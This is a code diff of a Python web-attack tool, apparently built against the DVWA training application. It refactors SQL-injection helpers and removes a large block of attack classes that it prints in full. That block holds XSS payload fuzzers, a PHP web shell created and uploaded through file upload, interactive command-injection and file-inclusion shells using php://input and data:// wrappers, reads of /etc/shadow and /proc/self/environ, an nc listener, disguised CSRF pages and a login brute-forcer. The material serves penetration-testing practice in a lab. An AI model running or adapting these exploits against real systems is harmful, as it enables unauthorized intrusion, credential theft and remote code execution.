@@ -4,20 +4,17 @@ from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from bs4 import BeautifulSoup
 from time import sleep
-from urllib.parse import unquote
-from urllib.parse import quote
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 
-import subprocess
-import string
-import random
-import hashlib
-import datetime
-import urllib
-import base64
-import html
-import os
-import codecs
+from core.xss_rsd import Xss_r,Xss_s,Xss_d
+from core.weak_session import SESSION
+from core.file_upload import FILE
+from core.file_include import Include
+from core.csrf import CSRF_GENERATE
+from core.command_execute import Command_Execute
+from core.brute_force import Brute
+
+#import codecs
 import binascii
 import sys
 import re
@@ -78,11 +75,14 @@ def get_database(url,cookies):
   prenumber = soup.find_all("pre")
   for each in range(len(prenumber)):
     s = re.search("First name: \w{0,20}",str(prenumber[each]))
+    if s is None:
+        continue
     list2.append(s.group(0).split(" ")[-1])
     print("\033[1;32m INFO\033[0m schema databases:",s.group(0).split(" ")[-1])
-  list2.pop()
-  if "information_schema" not in list2:
-    print("\033[1;32m Exploit\033[0m The databases:",list2[-1])
+  if len(list2) != 0:
+      list2.pop()
+      if "information_schema" not in list2:
+        print("\033[1;32m Exploit\033[0m The databases:",list2[-1])
   for ex in range(len(list2)):
     str2 = "' union select table_schema,table_name from information_schema.tables -- ".join(list1)
     rep1 = requests.get(str2,cookies=cookies)
@@ -102,6 +102,8 @@ def get_database(url,cookies):
   pre2 = soup.find_all("pre")
   for x in range(len(pre2)):
     s3 = re.search("Surname: \w{0,20}",str(pre2[x]))
+    if s3 is None:
+        continue
     col = s3.group(0).split(' ')[-1]
     if tablelist.count(col):
       s3 = re.search("First name: \w{0,20}",str(pre2[x])).group(0).split(" ")[-1]
@@ -142,7 +144,7 @@ def get_database(url,cookies):
     for num in range(len(pre4)):
       s5 = re.search("First name: \w{0,20}",str(pre4[num]))
       if s5 is None:
-        continue
+          continue
       print("\033[1;32m Table\033[0m "+tablelist[1],"\033[1;32m Column\033[0m "+columnlist[count],"\033[1;32m Data\033[0m "+s5.group(0).split(" ")[-1])
 
     count += 1
@@ -1126,989 +1128,7 @@ def high_level_blind(url,cookies):
   get = get_data(url,cookies,db,table[0],column,data)
   print(get)
 
-class Gun(object):
-  payloads = ['<script>alert(123);</script>',
-    '<ScRipT>alert("XSS");</ScRipT>',
-    '<script>alert(123)</script>',
-    '<script>alert("hellox worldss");</script>',
-    '<script>alert(“XSS”)</script>',
-    '<script>alert(“XSS”);</script>',
-    '<script>alert(‘XSS’)</script>',
-    '“><script>alert(“XSS”)</script>',
-    '<script>alert(/XSS”)</script>',
-    '<script>alert(/XSS/)</script>',
-    '</script><script>alert(1)</script>',
-    '‘; alert(1);',
-    '‘)alert(1);//',
-    '<ScRiPt>alert(1)</sCriPt>',
-    '<IMG SRC=jAVasCrIPt:alert(‘XSS’)>',
-    '<IMG SRC=”javascript:alert(‘XSS’);”>',
-    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
-    '<IMG SRC=javascript:alert(‘XSS’)>',
-    '<img src=xss onerror=alert(1)>',
-    '<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',
-    "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",
-    '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"']
 
-  exists = os.path.isfile("payload.txt")
-
-  if exists:
-    f = codecs.open("payload.txt","r",encoding='utf-8',errors='ignore')
-    payloads = f
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-  def Trigger(self):
-    self.Reuqest()
-    self.Payload()
-
-  def Reuqest(self):
-
-    rep = requests.get(self.url,cookies=self.cookies)
-    soup = BeautifulSoup(rep.text,"html5lib")
-
-    name_list = []
-    value_list = []
-
-    if soup.form:
-      for inputs in soup.form("input"):
-        Type = inputs.attrs
-        if 'name' in Type and Type['type'] == 'text':
-          name_list.append('name')
-          value_list.append(Type['name'])
-        elif Type['type'].lower() == 'submit':
-          name_list.append(Type['type'])
-          value_list.append(Type['value'])
-
-    get = soup.form['method'].lower()
-    if get == 'get':
-      self.param = dict(zip(name_list,value_list))
-
-
-  def Payload(self):
-
-    for num,payload in enumerate(Gun.payloads,start=0):
-      self.param['name'] = payload
-      rep = requests.get(self.url,cookies=self.cookies,params=self.param)
-      if payload in rep.text(payload):
-        print("\033[1;32mvalid payload: \033[0m",payload,end='')
-
-
-class Other_Gun(Gun):
-
-  cookie = {'domain':'172.17.0.2','httponly':False,'name':'PHPSESSID','value':'24nr5an77p46e52bipuv7luv12','path':'/','secure':False}
-  driver = webdriver.PhantomJS()
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-
-  def Other_Trigger(self):
-    self.Driver()
-
-
-  def Driver(self):
-
-
-    for each in self.cookies:
-      self.cookie['name'] = each
-      self.cookie['value'] = self.cookies[each]
-      self.driver.add_cookie(self.cookie)
-
-
-    self.driver.get(self.url)
-    print(self.driver.title)
-    print(self.driver.current_url)
-    self.source = self.driver.page_source
-
-    if self.driver.current_url != self.url:
-      while True:
-        self.driver.get(self.url)
-        print(self.driver.current_url)
-        if self.driver.current_url == self.url:
-          break
-
-    for payload in super().payloads:
-      if "meta" in payload.strip() or "refresh" in payload.strip():
-        continue
-
-      name_payload = payload
-      message_payload = payload
-      self.driver.execute_script("document.getElementsByTagName('textarea')[0].maxLength = 10000;")
-      self.driver.execute_script("document.getElementsByTagName('input')[0].maxLength = 10000;")
-      self.driver.find_element_by_name('txtName').send_keys(name_payload)
-      self.driver.find_element_by_name('mtxMessage').send_keys(message_payload)
-      self.driver.find_element_by_name('btnSign').click()
-
-      if name_payload.strip() in self.driver.page_source or name_payload.strip().lower() in self.driver.page_source or name_payload in self.driver.page_source:
-        print("\033[1;32m name valid payload find: \033[0m",name_payload,end='')
-        print("call find")
-        if self.find():
-          continue
-
-      elif message_payload.strip() in self.driver.page_source or message_payload.strip().lower() in self.driver.page_source or message_payload in self.driver.page_source:
-        print("\033[1;32m name valid payload find: \033[0m",message_payload,end='')
-        print("call find")
-        if self.find():
-          continue
-
-      else:
-        print("each don't have message")
-        print("\033[1;31m"+payload+"\033[0m",end='')
-        if self.find():
-          continue
-
-
-    self.driver.quit()
-
-
-
-  def find(self):
-    while True:
-      self.driver.find_element_by_name('btnClear').click()
-      self.driver.switch_to_alert
-      self.driver.execute_script("window.confirm = function(msg) { return true; }")
-      if "guestbook_comments" in self.driver.page_source:
-          continue
-      else:
-        return True
-
-
-
-class DOM(Other_Gun):
-
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-
-  def dom(self):
-    self.dom_request()
-
-
-  def dom_request(self):
-
-    for cookie in self.cookies:
-      self.cookie['name'] = cookie
-      self.cookie['value'] = self.cookies[cookie]
-      self.driver.add_cookie(self.cookie)
-
-    self.driver.get(self.url)
-    default = self.driver.find_element_by_tag_name("select").get_attribute('name')
-    get = self.driver.find_element_by_tag_name("form").get_attribute("method")
-    if get.lower() == 'get':
-      Default = "?"+default+"="
-      if self.cookies['security'] == 'high':
-        Default = Default + "English"+"#"
-
-    for payload in self.payloads:
-      payload = payload.strip()
-
-
-
-      url = self.url + Default + payload
-      self.driver.get(url)
-      value = self.driver.find_element_by_tag_name("option").get_attribute("value")
-
-      self.driver.refresh()
-
-      source = self.driver.page_source
-
-      uncode = unquote(value)
-      quote(payload)
-      unentity = html.unescape(payload)
-      one = html.unescape(quote(payload))
-      two = unquote(unentity)
-
-
-      if payload in source:
-        print("\033[1;31mnormal\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
-
-      elif uncode == payload:
-        print("\033[1;31mdecode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
-      elif quote(payload) in source:
-        print("\033[1;31mdecode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
-
-      elif unentity in source:
-        print("\033[1;31mhtml entity\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
-
-      elif one in source:
-        print("\033[1;31muncode to html entity\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
-
-      elif two in source:
-        print("\033[1;31mhtml entity to uncode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
-
-      else:
-        print("\033[1;33m"+payload+"\033[0m")
-
-
-
-class SESSION(object):
-
-  cookie = {'domain':'172.17.0.2','httponly':False,'name':'PHPSESSID','value':'24nr5an77p46e52bipuv7luv12','path':'/','secure':False}
-  driver = webdriver.PhantomJS()
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-  def session(self):
-    self.POST_SESSION()
-    self.URL()
-
-  def POST_SESSION(self):
-    for key in self.cookies:
-      self.cookie['name'] = key
-      self.cookie['value'] = self.cookies[key]
-      self.driver.add_cookie(self.cookie)
-
-  def URL(self):
-
-    while True:
-      self.driver.get(self.url)
-      self.driver.find_element_by_tag_name("input").click()
-      print("\033[1;32mSESSION Generate!\033[0m")
-      cookies = self.driver.get_cookies()
-
-      for key in cookies:
-        if "dvwaSession"  == key['name']:
-          session = self.driver.get_cookie("dvwaSession")
-          name = session['name']
-          value = session['value']
-          print(name,": ",value)
-          if self.cookies['security'] == "medium":
-            timestamp = int(value)
-            value = datetime.datetime.fromtimestamp(timestamp)
-            print("Type is unix time stamp")
-            print("\033[1;33mDecode Value\033[0m",name," : ",end='')
-            print(f"{value:%Y-%m-%d %H:%M:%S}")
-          elif self.cookies['security'] == 'high':
-            print("Type is md5 hashing asymmetric algorithm")
-            count = 0
-            while True:
-              md5 = hashlib.md5(str(count).encode())
-              if md5.hexdigest() == value:
-                print("\033[1;33mMD5 Value Find %s \033[0m" % str(count))
-                break
-              count += 1
-
-          elif self.cookies['security'] == 'low':
-            print("Type Is Base number")
-
-      q = input("press q to quit:")
-      if q == 'q':
-        self.driver.delete_all_cookies()
-        self.driver.quit()
-        break
-
-
-class FILE(object):
-
-  cookie = SESSION.cookie
-  driver = SESSION.driver
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-
-  def file(self):
-    if self.cookies['security'] == "high":
-      while True:
-        image = input("choice you image file:")
-        server_file = input("choice you shell file:")
-        tmp_img = image.split("/")[-1]
-        tmp_file = server_file.split("/")[-1]
-        os.system("cat "+image+" "+server_file+" > /tmp/"+tmp_img+"_"+tmp_file+".jpg")
-        if os.path.isfile("/tmp/"+tmp_img+"_"+tmp_file+".jpg"):
-          imagefile = "/tmp/"+tmp_img+"_"+tmp_file+".jpg"
-          print("file create")
-          print(imagefile)
-          self.check(imagefile)
-          print("you cen use thes file exploit with other vulnerability",end='')
-          print(" such as file include")
-          break
-    else:
-      self.Try()
-
-  def Try(self):
-    for key in self.cookies:
-      self.cookie['name'] = key
-      self.cookie['value'] = self.cookies[key]
-      self.driver.add_cookie(self.cookie)
-
-    options = ["php","choice my own file"]
-    for x,i in enumerate(options,start=0):
-      print(x," ",i)
-
-    while True:
-      choice = input("which type file you want to upload?:")
-      if choice not in string.digits:
-        print("wrong chioce,rechoice again!")
-      elif choice.isdigit() and int(choice) < len(options):
-        choice = int(choice)
-        break
-
-    if options[choice] == 'php':
-      print("Generate File")
-      rand = ''.join(random.sample(string.ascii_letters+string.digits,8))
-      File = rand+"."+options[choice]
-      path = os.path.exists("/tmp/")
-      if path:
-        call = subprocess.check_call("echo '<?php $c=chr(99);if(isset($_POST[$c]))system($_POST[$c]); ?>' > /tmp/"+File,shell=True)
-        if not call:
-          valid = self.check("/tmp/"+File)
-          if File in valid:
-            subprocess.check_call("rm /tmp/"+File,shell=True)
-            print("tmp file has been removede")
-            self.shell(valid)
-
-    if options[choice] == "choice my own file":
-      file_path = input("input you file path:")
-      if file_path:
-        if os.path.exists(file_path):
-          file_check = os.path.isfile(file_path)
-          if file_check:
-            self.check(file_path)
-            nc = input("open with ncat?:")
-            if nc in "yYyesYes":
-              port = input("input you listen port:")
-              os.system("nc -lvnp "+port)
-            else:
-              sys.exit()
-        else:
-          print("not such file")
-
-
-
-  def shell(self,valid):
-    data = {}
-    while True:
-      data['c'] = input("\033[1;32mshell:\033[0m")
-      rep = requests.post(valid,cookies=self.cookies,data=data)
-      if not rep.ok:
-        break
-      print(rep.text,end='')
-
-
-  def check(self,file_send):
-    if self.cookies['security'] == 'medium' or self.cookies['security'] == 'high':
-      files = {'uploaded':(file_send,open(file_send,'rb'),'image/png')}
-      data = {'Upload':'Upload'}
-      print("before")
-      rep = requests.post(self.url,cookies=self.cookies,files=files,data=data)
-      print("after")
-      soup = BeautifulSoup(rep.text,"html5lib")
-      text = soup.find_all("pre")[0].text
-    elif self.cookies['security'] == 'low':
-      self.driver.get(self.url)
-      self.driver.find_element_by_name("uploaded").send_keys(file_send)
-      self.driver.find_element_by_name("Upload").click()
-      text = self.driver.find_element_by_tag_name("pre").text
-
-    url = self.url
-    count = 0
-    str1 = ''
-    for each in url:
-      if count == 3:
-        break
-      if each == '/':
-        count += 1
-      str1 = str1 + ''.join(each)
-    check_path = str1+text.split("../../")[-1].split(" ")[0]
-    print("check file status")
-    rep = requests.get(check_path)
-    if rep.ok:
-      print(check_path,"upload file valid")
-
-    return check_path
-
-
-class Include(object):
-
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-  def include(self):
-    self.Test()
-
-  def Test(self):
-    if "?" not in self.url or "=" not in self.url:
-      sys.exit("wrong input url,please use url end with like ?id=1 param")
-    index = self.url.find("=")
-    self.url = self.url[:index+1]
-    print("Exploit with payloads")
-    print(self.url)
-    print("test with local file include")
-    self.local()
-    self.fake_protocol()
-    sys.exit()
-
-
-
-  def local(self):
-    payload = ["/etc/issue","/etc/passwd","/etc/shadow","/etc/group","/etc/hosts",
-        "/etc/motd","/etc/mysql/my.cnf","/proc/self/environ","/proc/[0-9]*/fd/[0-9]*",
-        "/proc/self/environ","/proc/version","/proc/cmdline"]
-
-    count = 0
-    for each in payload:
-      rep = requests.get(self.url+each,cookies=self.cookies)
-      if rep.ok:
-        text = rep.text.split("<!DOC")[0].strip()
-        if text != '':
-          print("payload valid: \033[1;32m%s\033[0m" % each)
-          count += 1
-
-    if not count:
-      print("Not valid payload find")
-
-
-
-  def fake_protocol(self):
-
-    fake_protocol = {}
-
-    self.php_input = "php://input"
-    self.php_filter = "php://filter/read=convert.base64-encode/resource="
-    self.data = "data://text/plain,<?php phpinfo(); ?>"
-    self.data_base64 = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo="
-    self.file_protocol = "file:///"
-    self.http_protocol = "http://"
-    self.zipfile = "zip:// only work in big than 5.3.0 php version"
-    self.bzip2file = "compress.bzip2://"
-
-    protocol = ['php_input','php_filter','data','data_base64','file_protocol',\
-        'http_protocol','zipfile','bzip2file','url']
-
-    fake_protocol['php_input'] = self.php_input
-    fake_protocol['php_filter'] = self.php_filter
-    fake_protocol['data'] = self.data
-    fake_protocol['data_base64'] = self.data_base64
-    fake_protocol['file_protocol'] = self.file_protocol
-    fake_protocol['http_protocol'] = self.http_protocol
-    fake_protocol['zipfile'] = self.zipfile
-    fake_protocol['bzip2file'] = self.bzip2file
-    fake_protocol['url'] = "useing nothing only try with my url %s " % self.url
-
-
-    for key,value in enumerate(fake_protocol.items()):
-      print(key,"\033[1;33m"+value[0]+":\033[0m \033[1;34m"+value[1]+"\033[0m")
-
-    print("press q to quit")
-    while True:
-      which = input("\033[1;32mwhich protocol you want to use?:\033[0m")
-      if which.isdigit():
-        if int(which) < len(protocol) and int(which) >= 0:
-
-          if protocol[int(which)] == "php_input":
-            self.PHP_INPUT()
-          elif protocol[int(which)] == "php_filter":
-            self.PHP_FILTER()
-          elif protocol[int(which)] == "data":
-            self.DATA()
-          elif protocol[int(which)] == "data_base64":
-            self.DATA_BASE64()
-          elif protocol[int(which)] == "file_protocol":
-            self.FILE_PROTOCOL()
-          elif protocol[int(which)] == "http_protocol":
-            self.HTTP_PROTOCOL()
-          elif protocol[int(which)] == "zipfile":
-            self.ZIPFILE()
-          elif protocol[int(which)] == "bzip2file":
-            self.BZIP2FILE()
-          elif protocol[int(which)] == 'url':
-            self.TRY_URL()
-
-      elif which == 'q' or which == 'exit' or which == 'Q':
-        sys.exit()
-
-
-  def PHP_INPUT(self):
-    print("test the php://input if valid")
-    param = self.url.split("?")[-1].split("=")[0]
-    data = param+"="+"<?php phpinfo(); ?>"
-    rep = requests.post(self.url+self.php_input,cookies=self.cookies,data=data)
-    if param+"="+"php://input" in rep.text:
-      print("\033[1;32mValid\033[0m")
-      print("prepare a shell")
-      while True:
-        code = input("\033[1;32mshell:\033[0m")
-        if code == 'exit':
-          break
-        data = param+"="+"<?php system("+code+"); ?>"
-        rep = requests.post(self.url + self.php_input,cookies=self.cookies,data=data)
-        if not rep.ok:
-          break
-        print(rep.text.split("<!DOC")[0].strip().split("=")[-1])
-
-    else:
-      print("Not work  %s with php://input" % self.url)
-
-    self.fake_protocol()
-
-
-
-  def PHP_FILTER(self):
-    filetoread = input("\033[1;31minput you want to read of that file:\033[0m")
-    rep = requests.get(self.url+self.php_filter+filetoread,cookies=self.cookies)
-    b64 = rep.text.split("<!DOC")[0].strip()
-    print("\033[1;32mget out put\033[0m")
-    print(b64)
-    y = input("\033[1;31myou want to decode? y or n:\033[0m")
-    if y in 'yYyesYesYES':
-      print("\033[1;32mdecode base64\033[0m")
-      print(base64.b64decode(b64).decode("ascii"))
-
-    self.fake_protocol()
-
-
-  def DATA(self):
-    print("Check data://text/plain if is valid")
-    rep = requests.get(self.url+self.data,cookies=self.cookies)
-    check = self.url.split("?")[-1]+self.data.split(",")[0]
-    if check in rep.text:
-      print("\033[1;32mValid\033[0m with %s" % self.data)
-      print("prepare a shell")
-      while True:
-        code = input("\033[1;32mshell:\033[0m")
-        if code == 'exit':
-          break
-        param = self.data.split(",")[0] +","+"<?php system("+code+"); ?>"
-        rep = requests.get(self.url+param,cookies=self.cookies)
-        if not rep.ok:
-          break
-        print(rep.text.split("<!DOC")[0].strip())
-    else:
-      print("\033[1;31mNot work with \033[0m%s" % self.data)
-
-    self.fake_protocol()
-
-
-  def DATA_BASE64(self):
-    print("Check with the %s " % self.data_base64)
-    rep = requests.get(self.url+self.data_base64,cookies=self.cookies)
-    if self.data_base64 in rep.text:
-      print("\033[1;32mprepare a shell\033[0m")
-      while True:
-        code = input("\033[1;32mshell:\033[0m")
-        code = "<?php system('"+code+"'); ?>"
-        code = code.encode('ascii')
-        code = base64.b64encode(code)
-        code = code.decode('ascii')
-        code = self.data_base64.split(",")[0] +","+code
-        rep = requests.get(self.url+code,cookies=self.cookies)
-        if rep.ok:
-          print(rep.text.split("<!DOC")[0].strip())
-        else:
-          break
-    else:
-      print("\033[1;31mNot work wit\033[0m %s" % self.data_base64)
-
-    self.fake_protocol()
-
-  def FILE_PROTOCOL(self):
-    while True:
-      print("target local file to input")
-      file_protocol = input("\033[1;31mstart with dir/file/file.*:\033[0m")
-      if file_protocol == 'exit':
-        print("want to brute file dir? coming soon")
-        break
-      rep = requests.get(self.url+self.file_protocol+file_protocol,cookies=self.cookies)
-      if rep.ok:
-        print("request url %s"%self.url+self.file_protocol+file_protocol)
-        print(rep.text.split("<!DOC")[0].strip())
-
-    self.fake_protocol()
-
-  def HTTP_PROTOCOL(self):
-    while True:
-      Type = ["GET","POST","quit"]
-      print("POST or GET?")
-      for x,i in enumerate(Type,start=0):
-        print(x,i)
-      choice = input(":")
-      if choice.isdigit():
-        if int(choice) < 2:
-          Type = Type[int(choice)]
-        else:
-          break
-
-      if Type == 'GET':
-        remote = input("\033[1;31minput you remote address url:\033[0m")
-        rep = requests.get(self.url+remote,cookies=self.cookies)
-        print("request url %s" % self.url+remote)
-        if rep.ok:
-          print(rep.text)
-          print("\033[1;32mGot requet\033[0m ")
-      elif Type == 'POST':
-        param = input("\033[1;31minput you post data param name and value split with [:]\033[0m")
-        key = param.split(":")[0]
-        value = param.split(":")[1]
-        data = {key:value}
-        remote = input("\033[1;31minput you remote address url:\033[0m")
-        rep = requests.post(self.url+remote,cookies=self.cookies,data=data)
-        if rep.ok:
-          print(rep.text.split("<!DOC")[0].strip())
-
-    self.fake_protocol()
-
-  def ZIPFILE(self):
-    zipfile = input("\033[1;31mzip file you want to link withed:\033[0m")
-    url = self.url+self.zipfile+zipfile
-    print("\033[1;31mRequest url\033[0m %s " % url)
-    rep = requests.get(url,cookies=self.cookies)
-    if rep.ok:
-      print(rep.text.split("<!DOC")[0].strip())
-
-    self.fake_protocol()
-
-  def BZIP2FILE(self):
-    bzip2file = input("\033[1;31mbzip2file you want to link withed:\033[0m")
-    url = self.url+self.bzip2file+bzip2file
-    print("\033[1;31mRequest url\033[0m %s" % url)
-    rep = requests.get(url,cookies=self.cookies)
-    if rep.ok:
-      print(rep.text.split("<!DOC")[0].strip())
-
-    self.fake_protocol()
-
-  def TRY_URL(self):
-    while True:
-      print("\033[1;31mYou url \033[0m%s " % self.url)
-      print("\033[1;31mq to quit\033[0m")
-      trY = input("\033[1;31mtry with my url:\033[0m")
-      print("\033[1;31mRequest url %s\033[0m" % self.url+trY)
-      rep = requests.get(self.url+trY,cookies=self.cookies)
-      if trY == 'q':
-        break
-      if rep.ok:
-        print(rep.text)
-
-    self.fake_protocol()
-
-
-class CSRF_GENERATE(object):
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-  def generate(self):
-    options = ["Generate csrf link Poc",
-    "Generate csrf html file Poc,[default type is hidden]",
-    "Generate csrf domain name html file Poc,[default type is hidden]",
-    "useing with javascript","q to quit"]
-
-
-    while True:
-      for num,op in enumerate(options,start=0):
-        print("\033[1;32m",num,"\033[0m",op)
-
-      self.op()
-
-  def op(self):
-    choice = input("\033[1;32minput you choice:\033[0m")
-    if choice.isdigit():
-      if int(choice) == 0:
-        self.low_base()
-        self.encode_base()
-      elif int(choice) == 1:
-        self.hidden_base()
-      elif int(choice) == 2:
-        self.bypass_base()
-      elif int(choice) == 3:
-        self.useing_with_javascript_base()
-      else:
-        print("\033[1;31mwrong number\033[0m")
-    else:
-      sys.exit("\033[1;32mquit\033[0m")
-
-  def low_base(self):
-    rep = requests.get(self.url,cookies=self.cookies)
-    soup = BeautifulSoup(rep.text,"html5lib")
-    method = soup.form['method']
-    form = soup.form("input")
-    if method.lower() == 'get':
-      print("\033[1;31mLink Generate\033[0m")
-      url = self.url + "?"
-      password = ''.join(random.sample(string.ascii_letters+string.digits,5))
-      for each in form:
-        if each['type'] == 'password':
-          url = url + each['name'] + "=" + password + "&"
-        elif each['type'].lower() == "submit":
-          url = url + each['name'] + "=" + each['value']
-      print(url)
-
-    return url
-
-  def encode_base(self):
-    print("\033[1;31myou can encode the link with online website\033[0m")
-
-  def hidden_base(self):
-
-    img_tag = "<img src="+self.low_base()+" border='0' style='display:none;'/>" \
-        "<h1>404</h1>"\
-        "<h2>file not found.<h2>"
-    filename = ''.join(random.sample(string.digits+string.ascii_letters,8))+".html"
-
-    with open(filename,"w") as f:
-      f.write(img_tag)
-      f.close()
-
-    print("\033[1;31mFile Generate\033[0m")
-    fileinfo = os.popen("ls -l "+filename)
-    print("\033[1;33m",fileinfo.readline(),"\033[0m")
-
-
-  def bypass_base(self):
-
-    img_tag = "<img src="+self.low_base()+" border='0' style='display:none;'/>" \
-        "<h1>404</h1>" \
-        "<h2>file not found.<h2>"
-
-    filename = self.url.split("http://")[1].split("/")[0]+".html"
-    with open(filename,"w") as f:
-      f.write(img_tag)
-      f.close()
-
-    print("\033[1;31mFile Generate\033[0m")
-    fileinfo = os.popen("ls -l "+filename)
-    print("\033[1;33m",fileinfo.readline(),"\033[0m")
-
-
-  def useing_with_javascript_base(self):
-    print("\033[1;31mcomming soon\033[0m")
-    print("\033[1;31mcan use store xss get the token to exploit the csrf high level\033[0m")
-
-
-class Command_Execute(object):
-
-  def __init__(self,url,cookies):
-    self.url = url
-    self.cookies = cookies
-
-  def execute(self):
-
-    self.post_code = ';'
-    rep = requests.get(self.url,cookies=self.cookies)
-    soup = BeautifulSoup(rep.text,"html5lib")
-    post = soup.form['method'].lower()
-    data = {}
-
-    if post == 'post':
-      tag = soup.form("input")
-
-      for t in tag:
-        if t['name'].lower() != 'submit':
-          ip = t['name']
-          data[ip] = ''
-        else:
-          data[t['name']] = t['value']
-
-      while True:
-        code = input("\033[1;32mshell:\033[0m")
-        data[ip] = self.post_code+code
-        rep = requests.post(self.url,cookies=self.cookies,data=data)
-        soup = BeautifulSoup(rep.text,"html5lib")
-        print(soup.pre.text,end='')
-
-        if code == 'q':
-          sys.exit('quit...')
-
-        if soup.pre.text == '':
-
-          for i,x in enumerate(['try to change the post code']):
-            print("\033[1;31m",i,"\033[0m",x)
-          choice = input("\033[1;32mnot work?:\033[0m")
-
-          if choice == '0':
-            print("input you post code,such as")
-            post_code = ["&",";",'|','||','&&']
-            for x in post_code:
-              print("\033[1;32m"+x+"\033[0m")
-            self.post_code  = input(":")
-            print("post code has been change")
-            print("You post code \033[1;32m%s\033[0m " % self.post_code)
-
-          if choice == 'q':
-            sys.exit('quit...')
-
-
-
-
-
-
-class Brute(object):
-  count = 0
-
-  def __init__(self,url,cookies):
-
-    self.url = url
-    self.cookies = cookies
-
-  def force(self):
-    self.orgin = requests.get(self.url,cookies=self.cookies)
-    self.user = input("\033[1;31minput a single username or username file path:\033[0m")
-    self.password = input("\033[1;31minput a single password or password file path:\033[0m")
-
-    user_exists = os.path.isfile(self.user)
-    pass_exists = os.path.isfile(self.password)
-
-    rep = requests.get(self.url,cookies=self.cookies)
-    soup = BeautifulSoup(rep.text,"html5lib")
-
-    method = soup.form['method']
-    form = soup.form("input")
-
-    if method.lower() == 'get':
-      self.url = self.url+"?"
-      for each in form:
-        if each['type'].lower() == 'text':
-          self.url = self.url + each['name'] + "=" + self.user + "&"
-        elif each['type'].lower() == 'password':
-          self.url = self.url + each['name'] + "=" +self.password + "&"
-        elif each['type'].lower() == 'submit':
-          self.url = self.url + each['name'] + "=" + each['value']
-
-    if user_exists and pass_exists:
-      self.both()
-
-    elif user_exists and not pass_exists:
-      self.single_password()
-
-    elif pass_exists and not user_exists:
-      self.single_username()
-
-    elif not user_exists and not pass_exists:
-      self.single()
-
-    else:
-      print("wrong input,quit...")
-      sys.exit()
-
-  def Token(self):
-    rep = requests.get(self.url,cookies=self.cookies)
-    soup = BeautifulSoup(rep.text,"html5lib")
-    token = soup.form("input")[3]['name']
-    value = soup.form("input")[3]['value']
-    return "&"+token+"="+value
-
-  def single_username(self):
-
-    url = self.url.split("&")
-
-    with open(self.password,'r') as pass_f:
-      for pas in pass_f:
-        force = url[0]+"&"+url[1].split("=")[0]+"="+pas.split("\n")[0]+"&"+url[2]
-        if self.cookies['security'] == 'high':
-          rep = requests.get(force+self.Token(),cookies=self.cookies)
-        else:
-          rep = requests.get(force,cookies=self.cookies)
-        print("Check %s:%s" % (self.user,pas.split("\n")[0]))
-        if self.check(rep.text,self.user):
-          print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (self.user,pas.split("\n")[0]))
-          pass_f.close()
-          sys.exit()
-
-
-
-  def single_password(self):
-    url = self.url.split("&")
-    with open(self.user,'r') as user_f:
-      for name in user_f:
-        force = url[0].split("=")[0] +"="+name.split("\n")[0] + "&" + url[1] + \
-            "&" + url[2]
-        if self.cookies['security'] == 'high':
-          rep = requests.get(force+self.Token(),cookies=self.cookies)
-        else:
-          rep = requests.get(force,cookies=self.cookies)
-        if self.check(rep.text,'',self.password):
-          print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (name.split("\n")[0],self.password))
-          user_f.close()
-          sys.exit()
-
-
-
-
-  def both(self):
-    url = self.url.split("&")
-
-    with open(self.user,'r') as user_f:
-      with open(self.password,'r') as pass_f:
-        for name in user_f:
-          for pas in pass_f:
-            Name = name.split("\n")[0]
-            Pass = pas.split("\n")[0]
-            N = url[0].split("=")[0]+"="+Name
-            P = url[1].split("=")[0]+"="+Pass
-            force  = N.strip()+"&"+P.strip()+"&"+url[2]
-            if self.cookies['security'] == 'high':
-              rep = requests.get(force+self.Token(),cookies=self.cookies)
-            else:
-              rep = requests.get(force,cookies=self.cookies)
-            print("Check %s:%s" % (Name,Pass))
-
-            if self.check(rep.text,Name,Pass):
-              print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (Name,Pass))
-              pass_f.close()
-              user_f.close()
-              sys.exit()
-
-          pass_f.seek(0)
-
-
-  def single(self):
-    if self.cookies['security'] == 'high':
-      rep = requests.get(self.url+self.Token(),cookies=self.cookies)
-    else:
-      rep = requests.get(self.url,cookies=self.cookies)
-    self.check(rep.text)
-
-
-  def check(self,text,N='',P=''):
-    if "Username and/or password incorrect." not in text and "CSRF token is incorrect" not in text and "Welcome" in text:
-      if N != '' and P != '':
-        return True
-      elif N != '':
-        print(text)
-        return True
-      elif P != '':
-        print(text)
-        return True
-      print("\033[1;32mUsername and Password Hint -> %s:%s\033[32m" % (self.user,self.password))
-      sys.exit()
-
-"""
-############## for some test
-
-def BRUTE(url,cookies):
-  password = "/usr/share/seclists/Passwords/probable-v2-top12000.txt"
-  link = url+"?username=admin&password="
-  rep = requests.get(url,cookies=cookies)
-  print(url)
-  print(rep.text)
-  soup = BeautifulSoup(rep.text,"html5lib")
-  token = soup.form("input")[-1]['value']
-  count = 0
-  with open(password,"r") as pass_f:
-    for each in pass_f:
-      each = each.split("\n")[0]
-      print(link+each+"&Login=Login&user_token="+token)
-      rep = requests.get(link+each+"&Login=Login&user_token="+token,cookies=cookies)
-      print(rep.text)
-      soup = BeautifulSoup(rep.text,"html5lib")
-      token = soup.form("input")[-1]['value']
-      print(token)
-      count += 1
-      if count == 4:
-        break
-"""
 
 
 @click.command()
@@ -2163,6 +1183,7 @@ def options_get(url,cookie_name,cookie_value,basesql,blindsql \
